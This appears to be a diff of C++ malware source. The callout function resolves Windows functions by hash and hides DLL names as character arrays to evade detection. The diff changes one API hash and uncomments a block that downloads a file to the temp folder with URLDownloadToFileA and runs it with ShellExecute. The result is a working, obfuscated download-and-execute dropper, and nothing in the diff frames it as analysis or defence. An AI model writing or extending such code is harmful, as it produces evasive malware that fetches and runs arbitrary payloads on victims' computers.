@@ -391,7 +391,7 @@ int callout(void)
    GetFileAttributesAHeader getFileAttributes = reinterpret_cast<GetFileAttributesAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xda1a7563));
    char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
    PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
-   URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xe6c2ead5));
+   URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xd8d746fc));
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
    SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
@@ -407,7 +407,6 @@ int callout(void)
 
    std::wcout << "URLDownloadToFileA: " << std::hex << fnv321a("URLDownloadToFileA") << std::endl;
    
-   /*
    getTempPath2(MAX_PATH, temp_path);
    strncat(temp_path, slash_sheep, strlen(slash_sheep));
 
@@ -427,7 +426,7 @@ int callout(void)
 
    if (reinterpret_cast<INT_PTR>(shellExecute(nullptr, nullptr, temp_path, nullptr, nullptr, 1)) <= 32)
       return 3;
-   */
+   
    return 0;
 }
 
